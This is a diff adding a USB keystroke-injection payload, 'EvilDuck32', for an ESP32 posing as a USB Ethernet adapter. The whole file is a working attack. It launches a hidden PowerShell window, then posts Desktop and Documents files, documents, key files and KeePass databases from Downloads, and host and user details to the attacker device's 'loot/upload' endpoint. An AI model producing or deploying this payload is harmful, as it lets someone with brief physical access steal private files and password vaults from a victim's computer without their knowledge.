@@ -1,0 +1,50 @@
+REM ============================================================
+REM EvilDuck32 – ATTACKMODE STORAGE (Windows)
+REM Exfiltrates Documents, Desktop, and environment info via RNDIS HTTP upload.
+REM Requires ATTACKMODE RNDIS (USB Ethernet adapter) to be connected.
+REM ESP32 acts as USB Ethernet adapter at 192.168.7.1
+REM ============================================================
+
+REM Wait until the USB Ethernet (RNDIS) interface is ready
+ATTACKMODE RNDIS 30000
+
+REM Give Windows 2 extra seconds to finish configuring the interface
+DELAY 2000
+
+REM Open a hidden PowerShell window to upload files
+GUI r
+DELAY 400
+STRING powershell -WindowStyle Hidden -Command "
+$upload = {
+    param($file)
+    try {
+        $name = [System.IO.Path]::GetFileName($file)
+        $bytes = [System.IO.File]::ReadAllBytes($file)
+        $req = [System.Net.HttpWebRequest]::Create('http://192.168.7.1/loot/upload')
+        $req.Method = 'POST'
+        $req.Headers.Add('filename', $name)
+        $req.ContentLength = $bytes.Length
+        $s = $req.GetRequestStream()
+        $s.Write($bytes, 0, $bytes.Length)
+        $s.Close()
+        $req.GetResponse() | Out-Null
+    } catch {}
+};
+$targets = @(
+    (Get-ChildItem $env:USERPROFILE\Desktop -File -ErrorAction SilentlyContinue | Select-Object -First 10),
+    (Get-ChildItem $env:USERPROFILE\Documents -File -ErrorAction SilentlyContinue | Select-Object -First 10),
+    (Get-ChildItem $env:USERPROFILE\Downloads -File -Recurse -Include *.pdf,*.docx,*.xlsx,*.txt,*.key,*.kdbx -ErrorAction SilentlyContinue | Select-Object -First 20)
+) | ForEach-Object { $_ };
+foreach ($f in $targets) { &$upload $f.FullName };
+$env_info = \"COMPUTERNAME=$env:COMPUTERNAME`nUSERNAME=$env:USERNAME`nUSERDOMAIN=$env:USERDOMAIN`nOS=$($(Get-WmiObject Win32_OperatingSystem).Caption)`n\";
+$bytes2 = [System.Text.Encoding]::UTF8.GetBytes($env_info);
+$req2 = [System.Net.HttpWebRequest]::Create('http://192.168.7.1/loot/upload');
+$req2.Method = 'POST'; $req2.Headers.Add('filename', 'sysinfo.txt');
+$req2.ContentLength = $bytes2.Length;
+$s2 = $req2.GetRequestStream(); $s2.Write($bytes2,0,$bytes2.Length); $s2.Close();
+$req2.GetResponse() | Out-Null
+"
+ENTER
+
+REM Wait for exfiltration to complete
+DELAY 5000
